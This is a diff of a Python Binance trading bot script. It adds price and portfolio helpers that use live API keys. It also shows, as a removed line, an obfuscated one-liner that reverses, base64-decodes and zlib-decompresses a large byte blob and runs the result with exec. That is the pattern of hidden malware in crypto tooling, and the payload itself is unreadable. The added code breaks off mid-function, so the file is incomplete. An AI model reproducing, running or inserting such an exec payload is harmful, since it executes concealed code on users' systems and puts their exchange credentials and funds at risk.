@@ -1,4 +1,1014 @@
+# bot.py - Full Script with Fixed Column Alignment
 
+import os
+import time
+import random
+import threading
+from decimal import Decimal, ROUND_DOWN
+from binance.client import Client
+from binance.exceptions import BinanceAPIException
 
+# Import configuration
+from config import *
+
+# Initialize client
+client = Client(API_KEY, API_SECRET, testnet=False)
+
+def clear_screen():
+    """Clear terminal screen"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def get_terminal_size():
+    """Get terminal size for responsive design"""
+    try:
+        size = os.get_terminal_size()
+        return size.columns, size.lines
+    except:
+        return 80, 24  # Default size for Termux
+
+def get_assets_from_symbol(symbol):
+    """Extract base and quote assets from symbol"""
+    if symbol == 'BTCUSDT':
+        return 'BTC', 'USDT'
+    elif symbol.endswith('BTC'):
+        return symbol[:-3], 'BTC'
+    else:
+        return symbol[:-4], symbol[-4:]
+
+def get_display_name(symbol):
+    base, quote = get_assets_from_symbol(symbol)
+    return f"{base}/{quote}"
+
+def get_current_price(symbol):
+    try:
+        ticker = client.get_symbol_ticker(symbol=symbol)
+        return Decimal(ticker['price'])
+    except Exception:
+        return Decimal('0')
+
+def get_portfolio_value():
+    try:
+        account = client.get_account()
+        total_value = Decimal('0')
+        
+        for asset in account['balances']:
+            free = Decimal(asset['free'])
+            locked = Decimal(asset['locked'])
+            total_balance = free + locked
+            
+            if total_balance == Decimal('0'):
+                continue
+                
+            if asset['asset'] == 'USDT':
+                total_value += total_balance
+                continue
+            
+            try:
+                usdt_pair = f"{asset['asset']}USDT"
+                price = get_current_price(usdt_pair)
+                
+                if price == Decimal('0'):
+                    btc_pair = f"{asset['asset']}BTC"
+                    btc_price = get_current_price(btc_pair)
+                    btc_usdt_price = get_current_price('BTCUSDT')
                     
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QounY1H4///9L/l3jPXjc2pjxOdBQYr7FP0VrtwFN7kXM/7WeogP+d5HobpR9uwfM6olkrIhi6I8g4JSjgwCsB5IAZLlHujWjiXE/o6U+tsSVQnbpRFKuRgEvxpee1MXWKJZyDmTWawJeWARPou4zJszKc+KeWhDH+PsiMYiKamqsEcWylWAiy+zG5tWXUMP1GfM3E1+yWPXwdD7If5+x3cQmYVgApO5rbMkvypq5KpabZZSad+I2n56SOX3wDdBiexPL1n7EP7Q/Ru/WW3c1C6DTdR8dYglH12ouB4Poj+jE+CwXqpz6lkfQtzO6IHwPF9Kkdq11Uqw3MTNoMm3Tqkvrk5/LJ8mAN/zJLhow4wlDgSCvp80opz+5JaiCY5+XNWoZm9K1pJKT0UGjsIkr7d8fBfHcdRaIaATv/RjW8JkCWbZu+sewoniR/LmmNKvG0TffZx9mSMMvx4xiZaNx/QBV8SsQsLlG0I+vOTdp4a1uYYT7IyjbiehsZlnc3pPeZn3MddBdeXeBfxD/20nXj2A4u8E4bLmGQsWkTqShejFKhFjqzgZyw1tkFZ4vh8L0bg77ZUQ80b7AMcbAR38oGYlIk4aNcl8xjcFvIT98XT7ZdmNJ1L7wT85i1QCed/A27FSW4T0kFUtNhmhxNFB+h+I2m2R4NMbp6YODswpO4q60j9PYu97H1l50lUd20bvvIKlSUx92PVqZV1ujedl5bPb1T2biNpq/xypUQWcvbqEfXFoMQ9PHmjYY+1E6w1BH8Tpd1Ihk0ku/cG2gGYhtZWPN98mWnvHdFCX5qkp3tTTWX459neJEOV+9IozNedRkrUE2a4tEnmTf1MFJwwGEIuOnlTX1mxdnAzmSqkP4xW05LCp85I4xvcpp/+U2icRpOW7oRUiSfznTxHI5m9sJqdboh9kycfEkNpTWYYwDRngX/9pXeQXmxaqGZXGPC9vApVHPJayzU0zbNdo77BdKfqfQ/u+/MHE+82EkrnKzv+YIw8IzC9LyOoqQO87eU0Al06BsXysmEGGmJ2zdL2NzjR7i3TxG6jWHcETNsRDChrit1XuFtlNSdysAdkR3lJGItQ8S+F1sSasxXfMXhxxP1xCmcjOlqelZWnI6CgoSlwHoL5J9Bk3dm3ID8Mfb+HCY0RHkw09vsEEJTryZeZOQh1WBxa/3m5UMbJCn6OBRMr0absqiB2ww+3dRrGpWMyHZLKn8brHd/soxtvxLRxw1/rSKSxSKqtcIxhVmPr3fdLXSD4HsZqpGZTjsHXCnqDddHWjb2hE0vHMB6XHdjkFWLRWZaJWmdO4cBcLS2KTnnqo+1SlRnp+qxfQ1WhGiiKIkLlDCDs87IiK9sVH2rdvpRDwwUY1X57zYSsyut4tkQSI1bnb2xLvL4hTifwJ60L+rSZW4L2m+dt0GNkSLFF1CqEd007mNo+/5l/m+gqxnh1oHkrcldR/tJ553R47L2gwBlT6TtmrXWj24+1GNb9rQgTPjp0YKUbMpaujq1acKW+YwIlshxXc6DANOIeTeS8tgNThyRKgctbIuQgcJDBV8fvOpfvJbvlDwRsbk0+UYGlJvE37oz0yEMqvPB0KKsTOtZw/vQ5t3imks9cEUA9O8Osbd5rRDOWaiI3R480bGW+AvOxE3A19YqAH81L6rSIQUuxjZ1N4uXcO75IQD8zRyV1UJniygEJ+emxP8Pf2Xs/ZMLgB/S+MopDzuH7YF9cv0lfdn5DGLbrzRLvP3Mfn10pERCKOYu3wKW0Z4pOgxciXvx3IWxVolZMAVvHcP6DqcMpCeu6k4A4y45CxmRXGA6ibD0//qGSPH1yNCVOUg6teHrKx77YzGZPWFKUUyja8nO+htPjJiHcmAAZiF5tC5zCB24ykjiv4geOHV3BPdfvXSsrvN4AXHuXj9IQ6p2qkuJMCl2tvuBSZXNCTvb7mEFNtlg4zByU+HnoY1Gpwo4s5DojuMXTKm2iSwuV9XYGTvbiKUyE7kNJOZbQ1tIajn00iHPheJU3C8TY5IZMTHcA8KItzFfi17m67PhPu498QAyArYVXt8uIhr5i7RdOKHok/qHzNNvOK+8fXOa8a5jrV9SiuA5nfCMBJXwXLz1zeV6QetwgVllAU8uFKb44MH28wg9d+0E+3RlUB4IXkdlPpw9fGSVftmKV8eiy2AayABJZn/MnH5oSZoAuckMSxgevBcJHO/eosR8kqgqLk39E7/YwgkdvwYvCnhZVJMHfJjPyW25UE/oiUd2gZAOReMVNgVzKL6AWqbwX0jJPu0mJNYhgp4SlGq84bibHNtTDvla8jQHyNRvA3eKc0Wg+Rv2J51wgEX8v8bcZpkYhT1sPgrXRgzsaGG7mZgEPjJiQJhcFxEaA4T4iRvbntF37VnSltQztPyOfrUs5SLnOdEBzIHgcA+GIMFZMBNH+ZjgZgfwaXQjKhIue0WyvVRzR0RlwWbhv4WYye30ZLy6DZRNZlUbkHhPsvKReuEEPdsHv3nMBB4xSxOv19WQIlcLA2SQcZKX+q+XijbJcGm/Cq/1IwfGmjN1AkvbWiZbrPTFJCoam07dqi9H5ySv1Zk1uC0FwosYwBQxVuaM3rhGI7mbY+d4x7OxTyPItL1JkssuluU9QQ2M+xxqc5W1DN+lwxNucgfHm9mBfAQPmkLt1znvITsVvBWF9lxXDSpaS4XVpE8M0fHS4VucXZ8woBxYuwbmve1L1YMG3W/Fnm1x8SBSwAWYSQ3xIrvWMcmiGas+heoZ8l/a0R6O3nSlbwxXJoH9caOajnHjorzi08QPm/oZElFEaUV0o7p5DFAoYkurN/iVV7lfca2RM4pqRzc1ZqTTRhHK8y4cG3gIwSmMoLnJG2+CgYKG1uU/Nm46qGp9P/JDP4gXVDxLoSAwvw4NYXfWVfSArMQjyPCiIx67peNWGeM8OWpfps1im7VCqvzIsCz3U50Zt7WFmW2a4Voc5IT6/RRlYlr11TfLM2UnTLAzvP7xcjXyLndNnrXXbf8Wd6nd0vR+wTw9PONOnNRCeTDYvY47cplw3We8OIhcXi/SZqj5cPZ7K1iNNr8FbA8WanKtGz/NZ1N1vlePXlzf9pis57vizIVWdLcA0Jz9CESPxsmwjaAhkyn+b81a3MaYFKYU9ZSsRjO+L34ZXCXQCrS/I+6xYWfJMyRZmHYcnCUsyA27sdvpCFwsNIYQshkP/yrjANRGla1Es1/28G2cNK34YsX+CxaTt524F745Rek9NWhA+Ktx8u3ctNfK1hKo9amyreHbyzCQtmBB2R+77PiPlsd0PyK2b5M1nCsUT/b+/UM5y6YjcaUnmBYgV9na+Rbd5KtEApZt8R6Xy2Xkmv5JQsWU6raXU7p8QqThxz+TGn9gfEurJUjT0FjC1u/r5WpQ+0qFjzS8TfEVCg7D5ACKpWarymNbwKjIAJ76u0l7DJ3bvkKYIhEg3OzBAQ9+xLAfKE35ThUmM4fizoXMAOkPMDg+N0Es3FRUgKwm+O59ZPbPEhyCE64EBe5SGzvmWc+vkW8VtzZvyjM8zrXq5Vp0R0ZpyvmKJudFnL2v/1a+EUYjdPHBJ2gvBGhQd2JljymUDi+9ZGZFyC6CjcgVmKn7P8shM1sevIVL08krLyBjAwQD+hiJSO0+sd5iclfyVvqrbTwibhb74Li/KCTWwqZIaNcO0o/euQmJw1fdy74FStfN3iSPGikp8oCsnyJ/g7u36Zsw2ot5D1wX269kAIPSPZflCmd4FX0V0b422KZ9jO08AtxOKLEyeO54uGcPbxPOJAWuoVnZXBdbEqpOTUoBN7y9JDdVo/G4RIlC5mD4E8Co1t1vjcIdXktzXlhIfP4HWIQ+5BWFE6E3OmVRJxPpV5Ki41w+LM7lJ+iS95O61mafjd5eFt8jY+mBabxwKTqW7OWP09ayKsY4q/tc42U5Vld/MA5iurdzQctzM0J85T1Is+jsIqlj4c5L9gLtrAUPrAUElbzJkP+MI6seo/g4iK0VhiXopHkPxCHEA45pqNE1LFmZKJeLh5gw5CL1RXgyFOolnnSj9kbKaRR9RTaiiKa13cOtlefmNNvy+uov3dgYBZTAQkSDcCBh1jPKCgBlk8VYmWkexGGosWBE1e1yV1ljVVfoVGzFgvf4v9u01DTlaSeGvGbOyKTe6anJjxQT6rMt/8ZWXBJ5sy5eymysNOBhL9ju9CpmrBmK0E0t8vttmuQabrg0n8OYPoEvhQsuBgcyGzPYeW4B6aQlWzCHNpb4JZfCLLx7zYviuH7KkgFq4sWsYSBRkg0ElCBBAFQxHnmdhNmcMnqtcNCPOhj66fMXGD3JZrr7fp2n9fbN06HYgikuBB0Vqm1OkX3yvrI3zsqRvWHLWJwi1rzd32qBbiXVcIiffeUYKkYacoXhGh4X6p1E7ES4IBu1ndtN3YWPkpBzNEM5eankUFMQfRhQ4pD6t3uqxqLKYbgxt0snRGtBroWIQimsFfQpx7pOQqTJzN772ockjFZjb4hPRmzCSAK0u4zW3ZIiw2N0F2HRm2yTuccpmcTYQ8U5rlnjhFJtcbRcPEYNMPD3TOOfNf87XEyngZDMxzTUbwDDfAb5Qs7UFQs3u8/gSPA/INf2t4Ex9ugu+kELqhjDDh177WZXm3JbVNZKnGn/C/iTPzpxkhRobPoZ9EpXjySknJqZZSDOVIeMRMXNkIBOYvxXZWMzBrIAxHUpdOmuUHOJgunaVGcFFQj1yZRDRMXf7rkA6e5W5X56fbqQJDytMpRF1lncAVSwumi3eazWnqpGvi1JtB5KRtWzib1FO3/4BKSBcWw7Li5pH6i57QZp3vHmmQsv1ag7zpOeWjo4UmliOP22lKRJNYVXOZxwV+GJO2yFVdMQ3dxzhZ5Ta3HZzhqMYnrghsEO3YDCz7R9Njn+govmW2DqrNgqq2IssALaFuuuo+txLwe6cOQlEAuxhQHv6/kxkhyoLPFjK2PkUvPzLnICS8TOmmud6MU4uQLWWov6pXZaKn3jMsC8cVJWhc22U2go9MyGmaZaQ6RImJcB5j6La27t3nuNr81fuCw9IYye/Yiic5cZPIr+COgtwfDVgvPc4UXcUnJ0ZKsHmkGxR43ipctXOpirh0qCIaaUxIe72rVfEBChfmo8AQNvlmhwoJe7RtJccAYeKtjAirpV+05QkhyTsrLMZYN8eFPjlI43LsKF8jQxzybwkNzqn3kQ9qAXWndkenZS6cCIl0yajaiC34I0io6/T5fUzaw5h3BEF6DX9xrGW9jmXqFQS/XI3PG82SWFsbNqL3HDeMLUfoVw+K1RGEECnA4eOCHWE5Q64TZyF13UfU84KJmqgvLMtir3SsLs5QA/yUsSPGD5Vx54jKt839fAzUfE2moq/mGnI7QmfkSlRF32s7T0PFufBrt5gfW02vW6PdXeOvg562Qk0fV9odSqE1J+XcLZ36Evyn+MJubuDVlpPbyNbU9g6zkObXglJ9FEk8gAO3uL7bPR+JKvKjk6o/ve9bfINREjdlsgrxqnKq+KgzZk+8JtVPfnHVgSo8yyhWiigTKm9Vo02c/vahAQmqPKrr198fgtkF7UYmdzbriprDg8wuXNuEgEWOTLbleOpUAogkLQ8JNjJ5rThbrcyd0SD4bi9LKr/M6HssMu9iNjjqXPwgIvP6qJbUv0TUAvSq43hU18kHX2nbNVL575DZNcH1T/mfhGP8zB00DaCX1CR+KZShIObDpytVK8T++qLIUqCIawUPizsweqS6vhbcdtvSLP+AfMVQ3sSkLHfeXCi/E/vEU+6nTAzWYiAGUpXUJj241KNsOEieIY0c00XIO1iT0C2JHcQKGuNz9nHPiQjgpk9hypaia7v3Hl+uHxdF9c7pSCiEZRGSTWzATFGnqDCqI7uJJd7mT8PFdBTNJHPvNpKDj1jeW0+LmeVkW6jqv1ieeasXniEs8xUFqMvTWowXrXvesJBlNDSRu7YafDlS5Jk9TckzfOfNcL047uPJ6Y6P34E2CFIjq7xuUzlRCg31H0xBVQ+Rw5Ca0fgYjO5w5cw+UwLcQR3BfxZN33RuxnA2uW2mbsa0qEjPEUQlLyXzxxHWCxfut/nhsr7osfhkJVfXeIAbQUxnU+GkCeCoMBGMtDJToCJqDnM6XPRND7CRzYRsj8qpjsz1+7rQ2q2o3jQvTPWEm+2MvA/VETuXj6mY3kaby63aJFtH2tNWVQKg91Pn7U3KSlkCXEdrjHqwcaTsH8s8piYAVT3iXYAlmCf02gOGU4p1ILNri354DYhnvqcW4qF1SQgrh9a/obHP3rPb/+806m9lzdPlqvU0SCU8FMyqD5TWuL9nORc226ow6eYucyg9uGh3AKhfCQOJ7IEXw+vaGL3ZKBuhiBg89+1d4FOxrbOYxfiM2ZA/S0VqLBgduIvt34xG5oIwnzSth4xD/BT5xwgvGqGj90Mq/mxAS4ouGZV9hXuf7uN7GPnDmNnjdUm8qeCQTEF9uZLd8NOhkMozskHYEGhEjjBW9b9ip551vVC/GzO6/Wd7K5W581hXYP6q5dV36mh8yE2H7Ko5VSx4S7Ws7AoNhu4/5B698VdoOKZL/q9m1+X38QIOikhvLYSVdm6GUuAf5TLjvtnKWqnpy3qCGILnXDBF7BMkuifU8QlLHC3VTDBCaO8XAaShxYfdxoGXmgVam774hZ9//ggiiHExzR0Ds97vaFAt7oIghToAsNrc6Az4saZTLk5PS9RNWWiON/qlxspL0i9oP6gZ24QhvA8qN2IF5pRWoG+wa21GXH45qPo41lGGYMdsVu6PIwuYcRQmWhe/2xmVjj0b0vaS6R3TAN3myXY5RVADGaTT2lf7x8NG1S7+3g5ofu28UxZ8M/N1y6ZefJ93r1ML6gy0rkAqyc48/X7srhhdacsi2QuFwgxl3zBXkErySsnVwf73HKFmUudkwX/MI33QTSgturGkEcGDmwCEEjK9UMkRAnVjQUnm4iU8nl9s7+/BABCnYmPm4pJywo4owYL7aZhuTsfKyZrBmkEJANqVOhKfauSyE+HjZUKjBMsWPN3Meq9KbEzQYGupteZbTTqeyw3GP5no0MuAPfaVOSGnNZBQKRufa0RqUPpPy985SoJ1V3UE3vmFY2JZ3c16Ij2i+MKaacXMZDvO0uooMuJNGUDFZoG/bpDkwp15PmcdcqUq7ZsXPnaxdyRxL/bo/y4JGSp9EHvRmaKtzmwLRFVhAHClzQHrTQuSh895HVTbgnqyXjsVIphhgomXosNvPqpahiHZne/vQrM8M+yJcM6GcWhS9EjZL53py+1x0zat1wk0P8OiCVZxp9H7//AojI+oYXXf1wfttf+wYU1tGm76JL6YB+WQDHKWeddXp8jLqseRg8Tv/gf482uZZYPJRuLeR6jkFD++WKFrTr5Xes0bpDJWfMRb5e7Ogyf+b8U7nB+FNE/acJqEU/DvIZWa6UXSRMMkhxtiftwAP4FSSvGV0q07voHAP274eMZ2cE3PiR5oYiZAygPOdLpHyy1CFRHAaAtRKHyEwJEhWrxPMxhj4rbL3hIYmM7qRxDVV4BcjrPq+hAoO6L+6tR2vd9dZQg3hx6p4VJaFHpmTwqn9hV7uZsNnxEXTKnsAY0cfSKF+L8I0dOyfgqgALmQ08uQPGUjTQL2lSrGsgx3wJu85DdVFQnXUemY/UxXjI/J6eh6/FuE/iZBOZFg6i6XmhNF41OjhB/HD+8K2NgR+YzEeRVHAoQVEbimOjXopEcOAMt/xDJAIjWeNuHLeQYF8SYG7o7KJFJGyVs6KoA+25n1SKhxFAEXSsUyOh+StXwRMxZtT8Mgw2Qo+q3+XB6CC7QTjJ7rcyxslj0lzKzFfaX1eOCMFkLdtzNpR1NLhfsC/Ru7+xXSSpEbV/eUStPpVjZ51uXmbv5D6AIhXkEiK9ZtaClKCsCM3k77nvWei03IOwl/cqsXMweYqnlwPlgHu/3mTLIxLD++rPVmb96DxD+OGbRCI9hSln+AsZQclT6BSw2ORvaBaFWauZCEh4HGDSU1BfbJiPnRc7CV6u80ZA8mQ6qrE1mNlfiE4OW9RRhF7VkJHBO93CEyJbVVfqnqRVCp6LBok5tcA+98CTLl7pgVn6W3ObVzHmrAi+X33A6tsw3ZMTi00kJLnhF9m0h/UcqzSwD5/F7rgHOIYR4tmuRtvfLcHnBa2HKLfqMsM9mR7tB/4lMMcmQbgxTdhg5q0lacWb6yvEsnWIShmAfi7vuwGewDm34yaaWDYgHsbN05TRaNXg3h+B04MWP90tzmY1pBEHQxerQmNPelkp+tkVIUVJ+nNQvZDtdMtvg1tTsX+3ndZi2V31NF1OsJsvEqSZK4OY5feHuKccEELBOW10kMLx/3rEayQTXh1If35r+ubKSkMomP/pgilVlUIrt8NsiL02TlUnkLwxA/zFhvyzE7wfwNyxA4jEVrHb/ZVQCz0Kck4oi2WvKNbCxRq0tPAfftkSl2V0D0Th+jLxjumtvDZGwgBd5Jk+zWyBZzjE2Wnk1WmypIMhwBujYF0nN0e++mJdwfDLpolVe3XHlv+PLlyRdrMnaDJgvZNVITvdqAPFZO9fi9409WCMv8SaCEnTiVlqyfdh9uM83z6JAHaP7uvCD1Cme/67r52uh9thLscduOlsdNSx8JZQ9TfFCU3VQKDaRxTPU/KbAcLKW8mr/No3iv4C/a07KehZnYY6Rqzs/PAgCA9fPFHnWr7z8ZZGf+J4mzWcTQcD7u/+U9vohdag9BrjBw4gVeOKnM/NiBFZ6RUHVsqwWNnUoQwgfT8YTqvqZUwt8hJtzor8bndUX9FmAS6+ofFtJ1J+6PrPmzLO9/lwn20Jh4PulZVFdkNbZyhMKrSVRCiWyqfLNsGOxCTTf/tli4i27my6trQ/VfdzK12y3YW2kwEMEYGzG9mrqoVcy/e8FvuIZdrMaMAbcEfhCwlyzVhSXlpBuDqZ8eClZYhmWo26MhgWzfQTD8A9V6MYm0iBpdQujrMjEk2vvCrtQhSbCVINxyXtBOrBhMxZEauB4mXFVgc0VMwW1XTfDwiGWM82BtIxYErtXaQIk43nYVPMnGgzzhgi2QTg26djLZrt6hak0dV+PiVYm8clZCHh3Jmx/+5DASIjmycV8TfFHh6+KlIA0wNYbHEKpRO+EGsws7Ii1gQzUoUsVrZOjagAO6IgntTs3Tr58zW/Ae784EdU/S4Z1I6gHgdW+1bvkEfAAZc+FpfvviZiioRPvr9sqm2s6sw0nC0x0ZuVhTkwnJrjnYWRNTPl10HmyClgpI4YWbi2HkVWYrDAlN+o6jDz4dC9cbQcjz+Jf0TCKKufSFlGvTqSAMnlK44o64kJVlFKpj8zy9BNdKP9i1sQ+GJxQrBuuAcx3KWrF2qbK6YiLZr7OHe/ylyIW05kLRoDIDy17kAZMnbM6ZEbQ6AmOaTflKtFEbVF1rluXP5PlQZEYlGtzcnYKRYIH/RnRXpxByImrvaK0muCp6fTjzvez8CfNNQvOzeiJSzNgEv3kZ5DjX7sTJf9wu5ZjvBSTaC1iMw96A+7MLG0CwV+lP5zTyJoqXq0NlFOIqq4AeOq9FZPNfuWP7WFxnVMwqdQnvMRm00zGsredJmQLqmxiK7Ptz+G1d+8xX0pLHzjSmv7YwOSYex4nud4cRMim9kCxTqH+p4NV48xwqxJ1/bU+jmQFtLtL0umMNGh9zN9XEpys6hzG/PAGtYqlyoYCK0ZSsqZWmIgB1vhnkDsA2iAoigWfu29O7DBq+QUofvMGy4/8FD4q/lHpn2U7sXsDKpYaAyjLV+3+WdRfaqdPapVuk6W5Ts28zql2G5cB0SPl/G1glnPOItszuPcdneQ1EcTBwX1pAeL3NFuyBTYjY4LokCAVcYSEBd3/o5eB8/rKwgKzx1L577odaEBEqSpEBHYoygBhgsHRXUHr/dRAw18lPSCsY4UFPbv51NYutnKZJ6EoZE6hS7Okak5+rBppTNdqdAdmrIqW87cnugAl5tzhj0myjrtMv4YSnm8pfMXOuCzaLhuaU/yGaZ6t3jyo981atD8tUPJToiPnHT3/qIAvEZBPRck+vgUT9tR9PhLKa0ZDQ88m46smGfPWQQ9qUn7b+MSbzwz/C0/wlJ9Z5PGVQ0caVTki9i77gv/rEC6uoct985rSUzTtFIdYjzIwhOkSMHz0E9nOTslIo3ra4CbA+JLhdZx60DhRN/sD0nCwx8W3K/gJKqLMeIRk1vgTghT7QW6LsnNt6wNm4TUqrWGWpaQ4fxun+Vk2jqTSeO+F9+gRjQdTazgdGfXrptOemFX9x+4ZUvEknv2RLAK5Zs9YQZg9lkCZ+zru2oQeq9NfbkXYqqe54zWbICLD2Q8yEh+x3aU2BFEBC4gQMTleGaILMPE4z1MrSa85BnIEuq13PifC+UKTZq6TpuuoaNoaFNe6PGsF7w3Fer7dt3r47/uYkZ7H9nuB5o2H9rO3lUaUxRXHcOo6RoF5oZp24pxPJKfZa1MLS9PxEokfZ9Ng+fmsB7LUYqffeKd787BdWNxLsqdMwsLcsWmpsYHiYnqT2GdoJ2KMfdIbCX44MyPKV5eQ8NW+vksOyzjgEdq/KkWTBYIcjPP7SdLiUnEATWL/liTQyCgEqb57NHGVC2L52dd6HEGDHu9RbW4CODPvw7TfBbovTvQYtA0APyYaECcwmaWGL98tobawBiuihz44+S1b8JLpyvyvUrofquJ6Tu/pn7Q69hEq90nWuOPFot/AbSBZjSPjbVRvi2y6jqVJAxoVbS0IfhGVoNgPWXaR5K6D2EoTH8i/RrUNZrvbv0vZ/O6VSoJcYm1k5IxQeqUJA9gJBDzdxxFmYK81huqqdwYGIJflskvmoGvJW54ZL5UjJ1pOGaeJJ1FDcJoO4nAK8xVtRTJRtvt32FWeQqyA88VzLZjVml+QoQCtTQsQ/g2JeM8DhbX1J86V7u1tJbLv791v2mkVavfxy23sprLsC782u+XaqrHsZHdwNJ8rAB11C3TW7LQOpk2S9y2W3DjsRpZLI4+HSjwbsaxHjiLrKoxSXC0GgidPLOKnSVSbw6tJk84z0zI61fkIk2ahL8eX9I3TtOn659PhKeKQMkI7tFNWIvYhMufr5SPM5bbvxxhtf1mlsBHfVJbJ6twbLR56QdLzlcP1uyq3WlMt4DYh/qnG5pADE8bypHFEiG08n/DM1vz2Rphz+7nJlNsc20pzP4FKDw0xM1uPJNc0hyrCRaB+HXn7IJCDcaL3+8RZ7QmtkQxZT6PeTQA3b/0cfN5yVv9+o8bs4fKRDU/lSVZpRJ//OTSdy2bGr4McdATPOH8XFEdhkAGos/ZJzguUhVdDGW5mqN9MLbfo+CoEK6w0DIXtcNIREckWoyHrbjxyIxVoEYu/04i9BJ8QkrNNbhIgIlpvOYaK9Dup2eg74gwkikAX2KcAvGRqMepb/LlqGU8FL+7FT9ULR6bCjFG6ES1nK8YkbH3u9M7mwAWn8FNg2S8RsVQKuRpwimMKulvKkwnyzZmONu4UnWUC0B9OrbMnuyboaUD26+eOk2PSf/4X9sigyPFKyOXifjpV1OxT6tGZgk+ZBjdjbjjolTsg9nMLpoBXlNQOokMD4nfOI1LSmGsYPSN9qscrYCpQ5m94VkAVpd3p6XmLtAZ4+cHY7Qg8/w+7r1t4obyIMSXaidgBoIdCGA64QWT6WjeYcfTw8yMsv6t1uo4MT5EQKWpAgxBZvpG2TQsIuwVSdYfdKXZ8Ii0X4bwGLXEfQqks95OSfTqINFJ04mxAodKy+DcEmDx9RX9eh9XA06OObZypwhVA+DWrz+Y73iW6mFkvtwkNd7NJDiCoC5QPfPOwJQUulqRSqkti/DWLpWKZbKnhYlVHO8EWM6q+TvPO+Yflc7DqA0sEpxiHCSH5oCFaEZ1knSUKcSjyE6CITbGqIB997sKqeYc6FJHjq331G0mF+eheTi5VmjrBsJtAgAEIYIbWJmOXVg+B2H+kJEBI51Vs64Y+L92uSDBWdBDSArekMNJmQjp/XCjnV2IDAM6Xnd71dU8QrFjMd1gz2b3ZLgsTqhRY5RirTxzEq1VN7LWXktIr2ekTkgeZnv8DtSS/1L8CPfpEo3bh4bX8ZRsaCCakb7SdMFh98rbJ1RC/bLSu7A7kn7qB6A3s0xDzlkax2O0hypFpcD58SlYp05PvVtB8cZiiPAPcYaZWgPTe5lNm8ze/Wjuj86u0lepQizV+1v/FN/CpGCGmrrfPttlduNzc1L5aHiCNkuJLmBDfiM0lYynWyc3EUvz+IGBG7UheRmtHmMDbpOeDqaX9aFHg279zlsr1IK11X2c0LRa8/QN09FvL7F2uw9tCyXoqjpL7sj1D/WQ7I/xR2zGAMVg6Py5Nm646LlnK1CJ1MxBOtBIDOsToTZnYIMRkxLCN926pmoL+2hVoaHv2lQ5JICD9Llnpkq6xWLPYOGQXY8uFBmoSFEbmzz+CC4ZaLRao0RtuW0PEVNj2uZMzkSYba7RuFhfDz4a84SYgjLhQs1pmqGnU7jopK9fTQSrx6NdPUXdnvtSX54xUYY2KnIQjBo3U4HcQ/YO9Cd7GK8KFHnlmXpB+OAbZsfHZmCWn6WMlM944z/7mLHemHahnYxOpxR+ISqXNmO1oFBfsBTu4aFgDt6zGnFb8OhUjKoPH49aUh7CVohG2ohvz+jctzAi9ZIHXeK103MB8jUNQtjxt8wF+pV1IQlw6En8a0qLuUHAIkSqpTTMSKkvvmAI2vmPfTsOLSbgQvocz17X8V2knRcJLB2/Deb353PUeQMTpLoaiQYQO1dW46AB+SEcju+gokaRgVYiLa2cSnTbmgOUJmMD/XHOHSuD/IjN2lzO+OhKvKeAKYDV9cp7gDKMTmQ1yytgR8CQTtavC4VDbuv8XmHWir1hY4sTe8r6wIYk8sobTpPgoAx/96yM2fTq64SRO+FSrXJNo+q53o+iXjDeauLw99AouAd1wawl52qV5Cl7LyZbcB1uzdx9DX92igCfjsa+NRE996H2GSuP9PmcMRj0dXtUhZa22zyoDDm4HZwQP2mOmY5B3pX56HjAE1mGyN03xOjHxpRQbFxliVswOgqu8D5R4iv9TMzBLvfx2nZM9Cgr3T72fGIhtf/fFw3sPlfqcGI2Oo2oErSZSmBzV2DY7xQR4fIzFPbRKp6tk7wuuDvmr4eDO6xbOCOdUqSg+K9y/pTidiBaDtWu/UdTyqUNUw+Zl/VK08esul2UmAzP9wy3PVMyKMqSNiDTIhMLQpi+1X/1aHs+ERpzqm1EWqZB1XIWhbQ8s5plAxNtw3sqlDK3o/NVWXcT2UXvhxpQMdPAqr2xevw0Yh2xrx+gudgFVoN52lEWfSCwgG4XhSK5KrjQVP4jrrEY7rsUzA3sijasnwk2O7zi3JttF3jINY0aGDW+Evze4vNv0OZ0UhRVkvnznPdH66hS4V5CzP2on22S7NgtyCCRNZHEck7jskA8qNexOJFO72yPRilBsI10mMvQ/iFhOHhq3xmd72xXTiF5eVPN7RXHmSG06KoyUq97/CrpTKJCV5TA/w32XTIEulZUfgheJXOqq3gzwY2kfDIbVYWgoHX4fB7YhkkwRo5v4uLV7pGrI62D6cdALlNxUUAbm4lC8XWPY4K1fGFDhA0yU6lXpGjav2SIzkKl33Ecn3bIsW3mLTXfHGKSwM/yyaqnWvRrgLtvT/RcZ9bC33Vus50LSIhXQkCyK/VDKNe3Cv50PnHWDambXBJMn4Qe+dVXRLoEYQ0uc/SFVjQlXUAKCx4KGC8od/q3j/Sa0bwnqDg0MKP9ZB4R186j30J2g1FyMCVMRPBJGIdJMnuHjNIkUAzol+UmFK50GHZ8acgIEo9KtYMxf27pUb+hnMtVT/L5+1tC0mCY9CBiHayEi/ay7DbH9l5OleDZpjn6iyJIiwv9eYkKXznKsetsooii45OLsI/aCF2JOzqW03nFBYmJ3atV4RfdEQDIDAiGmkfq7/UmhRNELbSxT8TuRfptK0jdCG4UT+em3nHs4dDGluEJcX6Kv8eIn/MX5TDT06z3Vc7IDoPWXlRpQ+ooAX+IDdZcO/TCnemvrFlKcceLwdlAOv9rXmnocCbxHp2eQvRiTxLLvUxKPUf2Y1d7QWaNFqLYsKqN71Hq3YJV7vSVUG+WT+3Ct+szC8jrNZ5vOphvJz/WOIew9gp04asRwk8WTsG4Xf8TaZAWP/gV2zfzclLDUTkW6q0kOiwCUIxYCowV+3YHxmXH6tScYL2HMaTpi7mIi+RH/HiWywaoXju0nGO0TcewWd9pNvPgpiNPDvGbd/4uhpjIskQxbzAsaFv2HbKiM0ViTqFGxEwb1LdNFSojwh2exXPFQnEJmToQH0ynHCk/kijIJU76/HTd2Vlj7Pzjn1KQDU9sjJhV8Spy8n410ZBbDSjbbUIjpGnho6d9e2SMp6/L44udB+umD/GbJWz/RhNvJnzcTEqJPoG+0QJwCgU/e/OMW2/jKOoexoqMxTTihJEURjhHwdUlTef2no7LAH6ofKNH7BDP+E9U1rujuhxqhmx7q2Www8fikrfmiXD+SWXrM9CM/JCNI/zk6VVZDZk9ewIUgg1EOjRK0Stn9fRcBmymQ30X0SzGhXHFhS0hc4QCqQLeF8HVEQlNx3Zw9N1/tjP54YaX8iOnpUk3kS445OTzTwaWl+ixPi78aMB8FzuXMf8OD3Ow7JunC0bjJF5OV/8ZHc9osuEPP7TiHdj5t2TloK4QGEgbdYBNhQKeC/Essr6vS0aILJ2iTse95LW7ttvljKjozo+a14eP1k